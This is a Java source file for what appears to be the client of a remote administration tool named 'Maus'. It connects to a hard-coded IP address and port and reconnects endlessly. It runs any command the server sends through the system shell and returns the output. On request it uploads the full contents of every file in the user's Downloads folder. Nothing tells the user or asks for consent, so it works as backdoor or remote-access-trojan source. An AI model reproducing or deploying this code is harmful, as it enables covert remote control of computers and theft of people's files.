package Client;

import java.io.*;
import java.net.Socket;

public class Client {
    private static String HOST = "141.219.244.29";
    private static int PORT = 22122;
    private BufferedOutputStream out;
    private Socket socket;


    private static String getHOST() {
        return HOST;
    }

    private static void setHOST(String HOST) {
        Client.HOST = HOST;
    }

    private static int getPORT() {
        return PORT;
    }

    private static void setPORT(int PORT) {
        Client.PORT = PORT;
    }

    public static void main(String[] args) throws InterruptedException {
        /* Load server settings and then attempt to connect to Maus. */
        Client client = new Client();
//        client.loadServerSettings();
        client.connect();
    }

    private void connect() throws InterruptedException {
        try {
            socket = new Socket(getHOST(), getPORT());
            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new BufferedOutputStream(socket.getOutputStream());
            System.out.println("Client started: " + getHOST() + ":" + getPORT());
            String comm;
            while ((comm = in.readLine()) != null && !comm.contains("forciblyclose")) {
                comm = in.readLine();
                if (comm.contains("CMD ")) {
                    System.out.println(comm);
                    exec(comm.replace("CMD ", ""));
                }
                if (comm.contains("FILES")){
                    sendFileList();
                }
                if (comm.equals("forciblyclose")) {
                    Writer writer = new OutputStreamWriter(out);
                    writer.write("forciblyclose");
                }
            }
        } catch (IOException e) {
            /* Continually retry connection until established. */
            System.out.println("Disconnected... retrying.");
            Thread.sleep(1200);
            connect();
        }
    }


    /* Sends a message to the Server. */
    private void communicate(String msg) throws IOException {
        PrintWriter writer = new PrintWriter(out);
        writer.write(msg);
        writer.flush();
    }

    /* Execute a command using Java's Runtime. */
    private void exec(String command) throws IOException {
        if (!command.equals("")) {

            try {
                Process proc = Runtime.getRuntime().exec(command);
                BufferedReader reader =
                        new BufferedReader(new InputStreamReader(proc.getInputStream()));
                String line = "";
                while ((line = reader.readLine()) != null) {
                    System.out.print(line + "\n");
                    communicate(line);
                }
                communicate("end");
            } catch (IOException e) {
                exec("");
            }

        }
    }

    private void loadServerSettings() {
        try (BufferedReader reader = new BufferedReader(new FileReader(new File(Client.class.getProtectionDomain().getCodeSource().getLocation() + "Client/.mauscs")))
        ) {
            System.out.println("Run");
            String line;
            StringBuilder stringBuilder = new StringBuilder();
            while ((line = reader.readLine()) != null) {
                stringBuilder.append(line);
            }
            String[] settings = stringBuilder.toString().split(" ");
            System.out.println(settings[0]);
            if (settings.length == 2) {
                setHOST(settings[0]);
                setPORT(Integer.parseInt(settings[1]));
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private void sendFileList() throws IOException {
        String directory = System.getProperty("user.home")+"/Downloads/";
        File[] files = new File(directory).listFiles();
        communicate("FILES");
        BufferedOutputStream bos = new BufferedOutputStream(socket.getOutputStream());
        DataOutputStream dos = new DataOutputStream(bos);

        dos.writeInt(files.length);

        for(File file : files){
            Long length = file.length();
            dos.writeLong(length);

            String name = file.getName();
            dos.writeUTF(name);

            FileInputStream fis = new FileInputStream(file);
            BufferedInputStream bis = new BufferedInputStream(fis);

            int fbyte = 0;
            while((fbyte = bis.read()) != -1) {
                bos.write(fbyte);

            }
            bis.close();
        }
        dos.close();
    }
}
